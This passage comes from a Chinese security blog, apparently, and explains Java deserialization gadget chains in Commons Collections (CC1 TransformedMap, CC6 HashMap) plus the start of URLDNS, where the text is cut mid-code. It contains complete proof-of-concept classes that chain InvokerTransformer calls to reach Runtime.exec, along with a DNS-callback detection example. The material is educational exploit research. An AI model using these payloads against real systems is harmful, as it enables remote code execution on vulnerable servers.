= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class=\"line\">Constructor annotationInvocationHandlerConstructor =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class=\"line\">annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class=\"line\">Object annotationInvocationHandlerObject =  annotationInvocationHandlerConstructor.newInstance(Override.class,decorateMap);</span><br></pre></td></tr></table></figure>\n\n<p>此时，大致的链子已经构成；但是想要正确序列化还需要满足三个问题：</p>\n<ul>\n<li><strong>Runtime类没有实现Serializable接口，不能对其进行序列化</strong></li>\n</ul>\n<p><img src=\"/../images/image-20240423233913063.png\" alt=\"image-20240423233913063\"></p>\n<p>解决办法:</p>\n<p>可以通过反射的方法来实例化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class c = Runtime.class;</span><br></pre></td></tr></table></figure>\n\n<p>返回类型是Class，Class类实现了Serializeable接口</p>\n<p><img src=\"/../images/image-20240423233951193.png\" alt=\"image-20240423233951193\"></p>\n<p>通过反射调用来RCE</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class c = Runtime.class;</span><br><span class=\"line\">Method getRuntimeMethod =  c.getMethod(&quot;getRuntime&quot;);</span><br><span class=\"line\">Runtime getRuntimeInovke = (Runtime) getRuntimeMethod.invoke(null);  // 静态方法调用无需传入对象</span><br><span class=\"line\">Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class=\"line\">execMethod.invoke(getRuntimeInovke,&quot;calc&quot;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240423234014063.png\" alt=\"image-20240423234014063\"></p>\n<p>​\t\t上述的Runtime通过反射，虽然可以进行序列化；但是可以直接利用之前的利用点InvokerTransformer类中的transform方法来实现对Runtime的RCE调用，InvokerTransformer类本身就实现了Serializable接口，可以进行序列化。</p>\n<p>修改代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 结构：new InvokerTransformer(&quot;方法名&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;).transform();</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>获得getMethod方法</li>\n</ul>\n<p><img src=\"/../images/image-20240423234047552.png\" alt=\"image-20240423234047552\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Method getMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class=\"line\">等价于</span><br><span class=\"line\">Method getRuntimeMethod =  c.getMethod(&quot;getRuntime&quot;);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>获得inovke方法</li>\n</ul>\n<p><img src=\"/../images/image-20240423234109771.png\" alt=\"image-20240423234109771\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Runtime getInvoke =  (Runtime)  new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getMethod);</span><br><span class=\"line\">等价于</span><br><span class=\"line\">Runtime getRuntimeInovke = (Runtime) getRuntimeMethod.invoke(null);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>获得exec方法</li>\n</ul>\n<p><img src=\"/../images/image-20240423234129390.png\" alt=\"image-20240423234129390\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(getInvoke);</span><br><span class=\"line\">等价于</span><br><span class=\"line\">Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span><br></pre></td></tr></table></figure>\n\n<p>执行结果，弹出计算器</p>\n<p><img src=\"/../images/image-20240423234149335.png\" alt=\"image-20240423234149335\"></p>\n<p>上述通过InvokerTransformer类的transform方法实现的RCE还是有个缺点，就是每个的返回值都得手动传给下一个，比较麻烦。这里有个ChainedTransformer类的transform方法可以遍历实现自动把每个返回值传给下一个的功能。</p>\n<p>修改代码：需要先创建一个Transform数组</p>\n<p><img src=\"/../images/image-20240423234204471.png\" alt=\"image-20240423234204471\"></p>\n<p>分析ChainedTransformer类的transform方法：遍历Transformer数组，并把每次的执行结构返回给下一次使用</p>\n<p><img src=\"/../images/image-20240423234216863.png\" alt=\"image-20240423234216863\"></p>\n<p>因为InvokerTransformer类和ChainedTransformer类本身都实现Transformer接口，所以创建InvokerTransformer对象的返回类型就是Transformer类型的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Transformer[] transforms = new Transformer[]&#123;</span><br><span class=\"line\">        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class=\"line\">        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class=\"line\">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class=\"line\">chainedTransformer.transform(Runtime.class);    // 编写此处代码时，其它代码注释掉了，暂时通过这个调用（后续需要找方法去代替）</span><br><span class=\"line\">// 实际上面一行代码不需要，是通过AnnotationInvocationHandler类的setValue方法传入Runtime对象执行，通过链子调用到transform方法</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240423234236442.png\" alt=\"image-20240423234236442\"></p>\n<ul>\n<li><strong>AnnotationInvocationHandler类的readObject方法中需要满足两个IF条件才能调用setValue方法</strong></li>\n</ul>\n<p><img src=\"/../images/image-20240423234251043.png\" alt=\"image-20240423234251043\"></p>\n<p>在IF语句处下个断点，在poc.java文件中进行debug，成功断在IF语句处；可以看到memberType参数为null，所以进入不了IF判断</p>\n<p><img src=\"/../images/image-20240423234309828.png\" alt=\"image-20240423234309828\"></p>\n<p>根据下图中的分析：</p>\n<p>​\t\t如果传入Override.class的话，是没有成员方法的。也就无法进入下面的IF判断。所以需要传入一个有成员方法的注解。memberTpye参数是通过memberTypes.get(name)获得的；而name是通过POC中Map集合传入获得的参数，即name的值为Map集合传入的键值</p>\n<p><img src=\"/../images/image-20240423234329240.png\" alt=\"image-20240423234329240\"></p>\n<p><img src=\"/../images/image-20240423234337820.png\" alt=\"image-20240423234337820\"></p>\n<p><img src=\"/../images/image-20240423234345961.png\" alt=\"image-20240423234345961\"></p>\n<p>修改POC传入的参数为Target.class</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Object annotationInvocationHandlerObject =  annotationInvocationHandlerConstructor.newInstance(Target.class,decorateMap);</span><br></pre></td></tr></table></figure>\n\n<p>分析：可以看到memberTypes中已经有内容了，但是到446行代码处，返回的值仍然是null；该函数的意思是获取变量name的值。因为POC传入的键值是key_test，get函数匹配不到所以返回为null</p>\n<p><img src=\"/../images/image-20240423234417296.png\" alt=\"image-20240423234417296\"></p>\n<p>修改POC</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">map.put(&quot;value&quot;,&quot;value_test&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>分析：Map集合传入键值为value字符串后，满足get函数的条件，获得内容，进入IF判断</p>\n<p><img src=\"/../images/image-20240423234448329.png\" alt=\"image-20240423234448329\"></p>\n<p>​\t\t继续debug，步进；内层IF判断：判断变量value的是否是memberType类的实例，这里明显不是。value的内容为value_test字符串，两者没有任何关系，直接进入内层IF判断。</p>\n<p><img src=\"/../images/image-20240423234507487.png\" alt=\"image-20240423234507487\"></p>\n<ul>\n<li><strong>AnnotationInvocationHandler类中的setValue无法直接传入Runtime对象</strong></li>\n</ul>\n<p>分析：</p>\n<p>​\t\tsetValue() 处中的参数并不可控，而是指定了 AnnotationTypeMismatchExceptionProxy 类，是无法进行命令执行的。需要换一个思路，不能从此处入手；如果能找到一个类有transform方法并且还能够控制transform方法的传参的话，就可以在链子调用到transform方法前通过这个类修改传参内容。</p>\n<p><img src=\"/../images/image-20240423234529514.png\" alt=\"image-20240423234529514\"></p>\n<p>ConstantTransformer类可以实现上述的功能：根据构造方法的分析，只要传入什么对象就返回什么对象，而transform方法不管传入什么都返回构造方法传入的对象参数</p>\n<p><img src=\"/../images/image-20240423234542793.png\" alt=\"image-20240423234542793\"></p>\n<p>构造最终POC</p>\n<p><img src=\"/../images/image-20240423234555171.png\" alt=\"image-20240423234555171\"></p>\n<h3 id=\"3-POC\"><a href=\"#3-POC\" class=\"headerlink\" title=\"3. POC\"></a>3. POC</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import org.apache.commons.collections.Transformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.xml.crypto.dsig.Transform;</span><br><span class=\"line\">import java.awt.image.renderable.RenderableImage;</span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\">import java.lang.annotation.Target;</span><br><span class=\"line\">import java.lang.reflect.Constructor;</span><br><span class=\"line\">import java.lang.reflect.Method;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @author shiyingai</span><br><span class=\"line\"> * @create 2023-03-02 23:12</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class poc &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transforms = new Transformer[]&#123;</span><br><span class=\"line\">                new ConstantTransformer(Runtime.class), // 必须写在第一行，先获得Runtime类</span><br><span class=\"line\">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class=\"line\">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class=\"line\">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class=\"line\">        // 以上代码是为了实现Runtime参与序列化，反射调用RCE</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class=\"line\">        map.put(&quot;value&quot;,&quot;value_test&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null,chainedTransformer);     // TransformedMap类间接实现于Map接口</span><br><span class=\"line\"></span><br><span class=\"line\">        Class annotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class=\"line\">        Constructor annotationInvocationHandlerConstructor =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class=\"line\">        annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class=\"line\">        Object annotationInvocationHandlerObject =  annotationInvocationHandlerConstructor.newInstance(Target.class,decorateMap);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        // 对AnnotationInvocationHandler类进行序列化</span><br><span class=\"line\">        serialize(annotationInvocationHandlerObject);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 对AnnotationInvocationHandler类进行反序列化</span><br><span class=\"line\">        unserialize(&quot;ser.bin&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 序列化</span><br><span class=\"line\">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class=\"line\">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 反序列化</span><br><span class=\"line\">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class=\"line\">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        return obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行POC，弹出计算器</p>\n<p><img src=\"/../images/image-20240423234630906.png\" alt=\"image-20240423234630906\"></p>\n<h3 id=\"4-调用链\"><a href=\"#4-调用链\" class=\"headerlink\" title=\"4. 调用链\"></a>4. 调用链</h3><p><img src=\"/../images/image-20240423234659535.png\" alt=\"image-20240423234659535\"></p>\n<h3 id=\"拓展\"><a href=\"#拓展\" class=\"headerlink\" title=\"拓展\"></a>拓展</h3><ol>\n<li><strong>有无readObject方法的情况</strong></li>\n</ol>\n<p>​\t\t当一个类实现了Serializable接口并且在类中定义了readObject方法时，在反序列化该类的过程中，readObject方法会被执行。readObject方法是在反序列化期间由Java的序列化机制自动调用的特殊方法。它的作用是在对象被反序列化后控制其<strong>自定义的处理逻辑</strong>。</p>\n<p>​\t\t当一个类实现了Serializable接口，它的对象可以被序列化和反序列化。如果在反序列化时，被反序列化的类没有定义readObject方法，Java的序列化机制会使用默认的反序列化行为。默认情况下，它会按照类的成员变量的顺序和类型来进行反序列化，然后为对象的字段赋予相应的值。</p>\n","categories":["Java反序列化漏洞专题"],"tags":["CC链","Commons Collections","TransformdMap"]},{"title":"CC6-HashMap链","url":"/2023/03/07/CC6-HashMap%E9%93%BE/","content":"<p>注：CC6不受JDK版本和commons-collections版本的限制，使用到的类都是一些比较原生态的类，限制没那么多。</p>\n<h3 id=\"实战分析\"><a href=\"#实战分析\" class=\"headerlink\" title=\"实战分析\"></a>实战分析</h3><p>实现RCE的利用点还是和CC1的LazyMap链一样，利用到了InvokerTransformer类和LazyMap类实现。CC1的LazyMap链是使用到了AnnotationInvocationHandler的动态代理来调用到LazyMap类的get方法</p>\n<p>CC6的话，利用到的类是：TiedMapEntry类，在getValue方法中，通过map参数去调用get方法</p>\n<p><img src=\"/../images/image-20240424001526837.png\" alt=\"image-20240424001526837\"></p>\n<p>map参数在构造方法中获得可控，那么传入LazyMap类即可构成链子</p>\n<p><img src=\"/../images/image-20240424001541140.png\" alt=\"image-20240424001541140\"></p>\n<p>接下来找哪里调用了getValue方法，搜索发现在本类中有个hashCode方法调用到了getValue方法</p>\n<p><img src=\"/../images/image-20240424001557746.png\" alt=\"image-20240424001557746\"></p>\n<p>看到hashCode方法，有经验的话；第一反应就能反应到HashMap类，HashMap类中的readObject方法，会间接触发调用到任意对象的hashCode方法</p>\n<p><img src=\"/../images/image-20240424001619675.png\" alt=\"image-20240424001619675\"></p>\n<p>hash方法中可传入任意对象，调用任意对象的hashCode方法，那么这里就可以给key参数传入TiedMapEntry类</p>\n<p><img src=\"/../images/image-20240424001654269.png\" alt=\"image-20240424001654269\"></p>\n<p>编写初步POC，因为TiedMapEntry类是public修饰的，所以不需要通过反射来调用</p>\n<p><img src=\"/../images/image-20240424001712794.png\" alt=\"image-20240424001712794\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Transformer[] transforms = new Transformer[]&#123;</span><br><span class=\"line\">        new ConstantTransformer(Runtime.class), // 必须写在第一行，先获得Runtime类</span><br><span class=\"line\">        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class=\"line\">        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class=\"line\">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class=\"line\">// 以上代码是为了实现Runtime参与序列化，反射调用RCE</span><br><span class=\"line\"></span><br><span class=\"line\">Map&lt;Object,Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class=\"line\">Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,&quot;aaa&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">HashMap&lt;Object,Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class=\"line\">hashMap2.put(tiedMapEntry,&quot;bbb&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>运行poc，发现在序列化的时候就弹出了计算器</p>\n<p><img src=\"/../images/image-20240424001738825.png\" alt=\"image-20240424001738825\"></p>\n<p>分析：</p>\n<p>CC6和URLDNS那条链子一样，HashMap类的put方法也会触发hashCode方法，所以在序列化之前就构成了链子的入口。需要修改POC，可以在put的时候，调用一个不是目标利用点的地方，这样就不会触发RCE了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap1,new ConstantTransformer(1));</span><br></pre></td></tr></table></figure>\n\n<p>这样子运行后，就不会调用到RCE的地方</p>\n<p><img src=\"/../images/image-20240424001809526.png\" alt=\"image-20240424001809526\"></p>\n<p>再通过反射，动态修改LazyMap类中的decorate方法的第二个参数，第二个参数是factory</p>\n<p><img src=\"/../images/image-20240424001826969.png\" alt=\"image-20240424001826969\"></p>\n<p>编写POC，这样在put的时候，因为链子没连上就不会触发RCE；在put结束后，通过反射又改回factory参数的值，重新连上链子；序列化的时候，最终存入的内容是成功的链子</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 反射修改LazyMap类的factory参数</span><br><span class=\"line\">Class c = LazyMap.class;</span><br><span class=\"line\">Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class=\"line\">factoryField.setAccessible(true);</span><br><span class=\"line\">factoryField.set(decorateMap,chainedTransformer);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240424001850676.png\" alt=\"image-20240424001850676\"></p>\n<p>取消注释反序列化函数，看看能否正常RCE；执行后发现仍然不弹出计算器</p>\n<p><img src=\"/../images/image-20240424001906986.png\" alt=\"image-20240424001906986\"></p>\n<p>注释反序列化函数，debug下个断点，调试一下看看；发现在序列化的时候，会进行put操作，在hashmap1集合中加入一个键值对</p>\n<p><img src=\"/../images/image-20240424001921102.png\" alt=\"image-20240424001921102\"></p>\n<p>查看hashmap1集合的内容</p>\n<p><img src=\"/../images/image-20240424001947475.png\" alt=\"image-20240424001947475\"></p>\n<p>注释序列化函数，取消注释反序列化函数，重新debug；发现无法进入IF判断了，也就无法执行transform方法，构不成链子</p>\n<p><img src=\"/../images/image-20240424002001421.png\" alt=\"image-20240424002001421\"></p>\n<p>通过计算表达式的结果，发现返回结果是true，所以进入不了IF判断</p>\n<p><img src=\"/../images/image-20240424002013301.png\" alt=\"image-20240424002013301\"></p>\n<p>map集合当前的键名是hashmap1，键值是aaa，这是之前序列化的时候传进来的。get方法的形参key的内容也是aaa，所以最后才导致表达式【map.containsKey(key)】返回结果是true，进入不了IF判断</p>\n<p><img src=\"/../images/image-20240424002030320.png\" alt=\"image-20240424002030320\"></p>\n<p>解决办法，删除hashmap1集合的键值即可；执行poc，成功弹出计算器</p>\n<p><img src=\"/../images/image-20240424002044274.png\" alt=\"image-20240424002044274\"></p>\n<p>完整POC如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import org.apache.commons.collections.Transformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\">import org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\">import java.lang.annotation.Target;</span><br><span class=\"line\">import java.lang.reflect.Constructor;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.lang.reflect.InvocationHandler;</span><br><span class=\"line\">import java.lang.reflect.Proxy;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @author shiyingai</span><br><span class=\"line\"> * @create 2023-03-08 2:39</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class CC6 &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transforms = new Transformer[]&#123;</span><br><span class=\"line\">                new ConstantTransformer(Runtime.class), // 必须写在第一行，先获得Runtime类</span><br><span class=\"line\">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class=\"line\">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class=\"line\">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class=\"line\">        // 以上代码是为了实现Runtime参与序列化，反射调用RCE</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap1,new ConstantTransformer(1));</span><br><span class=\"line\">        </span><br><span class=\"line\">        TiedMapEntry tiedMapEntry =  new TiedMapEntry(decorateMap,&quot;aaa&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class=\"line\">        hashMap2.put(tiedMapEntry,&quot;bbb&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = LazyMap.class;</span><br><span class=\"line\">        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class=\"line\">        factoryField.setAccessible(true);</span><br><span class=\"line\">        factoryField.set(decorateMap,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        decorateMap.remove(&quot;aaa&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(hashMap2);</span><br><span class=\"line\"></span><br><span class=\"line\">        unserialize(&quot;ser.bin&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 序列化</span><br><span class=\"line\">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class=\"line\">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 反序列化</span><br><span class=\"line\">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class=\"line\">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        return obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"调用栈\"><a href=\"#调用栈\" class=\"headerlink\" title=\"调用栈\"></a>调用栈</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">-&gt;ObjectInputStream.readObject()</span><br><span class=\"line\">    -&gt;HashMap.readObject()</span><br><span class=\"line\">        -&gt;HashMap.hash()    </span><br><span class=\"line\">            -&gt;TiedMapEntry.hashCode()</span><br><span class=\"line\">                -&gt;TiedMapEntry.getValue()</span><br><span class=\"line\">                    -&gt;LazyMap.get()</span><br><span class=\"line\">                        -&gt;ChainedTransformer.transform()</span><br><span class=\"line\">                            -&gt;ConstantTransformer.transform()   </span><br><span class=\"line\">                                -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>\n\n","categories":["Java反序列化漏洞专题"],"tags":["CC链","Commons Collections","HashMap"]},{"title":"URLDNS链","url":"/2023/02/05/URLDNS%E9%93%BE/","content":"<h3 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h3><p>​\t\tURLDNS就是ysoserial中一个利用链的名字。但准确来说，这个其实不能称作“利用链”。因为其参数不 是一个可以“利用”的命令，而仅为一个URL，其能触发的结果也不是命令执行，而是一次DNS请求。</p>\n<p>​\t\t虽然这个“利用链”实际上是不能“利用”的，但因为其如下的优点，非常适合在检测反序列化漏洞时使用。</p>\n<p>优点：</p>\n<ul>\n<li>使用Java内置的类构造，</li>\n<li>对第三方库没有依赖 </li>\n<li>在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>\n</ul>\n<h3 id=\"URLDNS链调用栈\"><a href=\"#URLDNS链调用栈\" class=\"headerlink\" title=\"URLDNS链调用栈\"></a>URLDNS链调用栈</h3><p>HashMap重写了writeObject和readObject，没有使用JDK统一的默认序列化与反序列化</p>\n<p><img src=\"/../images/image-20240423230306623.png\" alt=\"image-20240423230306623\"></p>\n<h3 id=\"gadget分析\"><a href=\"#gadget分析\" class=\"headerlink\" title=\"gadget分析\"></a>gadget分析</h3><p>​\t\t在Java反序列化中，会调用被反序列化类的readObject方法，当readObject方法被重写不当时，就会产生漏洞。</p>\n<p>分析：HashMap类的readObject方法，先调用putVal方法，然后调用hash方法（hash方法处理完后的结果再给putVal方法）</p>\n<p><img src=\"/../images/image-20240423230426024.png\" alt=\"image-20240423230426024\"></p>\n<p>分析hash方法：传入一个对象key，key不为null就调用该对象的hashCode方法</p>\n<p><img src=\"/../images/image-20240423230453291.png\" alt=\"image-20240423230453291\"></p>\n<p>继续分析hashCode方法：这里可以不用继续跟进HashMap类了，因为hash方法可以传入对象，所以可以调用任意类的hashCode方法；</p>\n<p>​\t\t这里使用URL类的hashCode方法：有一个判断：hashCode变量不为-1，就会进入if判断，不会执行下面的hashCode方法；并且该hashCode方法是URLStreamHandler类的，且把当前URL对象传入作为参数。hashCode变量的默认值是-1。（handler使用transient关键字定义，不参与序列化）</p>\n<p><img src=\"/../images/image-20240423230518590.png\" alt=\"image-20240423230518590\"></p>\n<p><img src=\"/../images/image-20240423230536422.png\" alt=\"image-20240423230536422\"></p>\n<p>​\t\t关于前面的hashCode变量的值：根据链子，必须让他第一次不为-1，直接返回hashCode变量；第二次要让hashCode变量为-1，才能跳出if判断，进而执行URLStreamHandler类的hashCode方法。</p>\n<p>原因：</p>\n<p>​\t\t第一次不为 -1，第二次为 -1（<strong>利用反射来控制hashCode变量的值</strong>）；这里需要分析HashMap类的put方法，通过该put方法传入键值对的时候，发现也会调用hash –&gt; hashCode（<strong>和readObject方法一样，这样的话，在URL对象传入到HashMap的时候，就会还没序列化就触发了DNS请求，也就无法校验是否存在序列化漏洞了</strong>）</p>\n<p><img src=\"/../images/image-20240423230620913.png\" alt=\"image-20240423230620913\"></p>\n<p>跟进URLStreamHandler类的hashCode方法，然后跟进getHostAddress方法</p>\n<p><img src=\"/../images/image-20240423230654401.png\" alt=\"image-20240423230654401\"></p>\n<p>最终到getByName方法：该方法会对传入的域名进行IP解析，相当于一次DNS请求（以上就是该URLDNS链的基本分析）</p>\n<p><img src=\"/../images/image-20240423230713415.png\" alt=\"image-20240423230713415\"></p>\n<h3 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import java.io.*;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.net.URL;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\">public class dnsTest &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\">        HashMap hashmap = new HashMap();</span><br><span class=\"line\">        URL url = new URL(&quot;http://zq5040.dnslog.cn&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 反射修改hashCode值不等于 -1，不让HashMap类的put方法触发dns请求，因为URL类中hashCode变量初始化值为 -1</span><br><span class=\"line\">        Class cls = Class.forName(&quot;java.net.URL&quot;);    // 类的静态代码块执行，其它代码一律不执行</span><br><span class=\"line\">        Field f = cls.getDeclaredField(&quot;hashCode&quot;);</span><br><span class=\"line\">        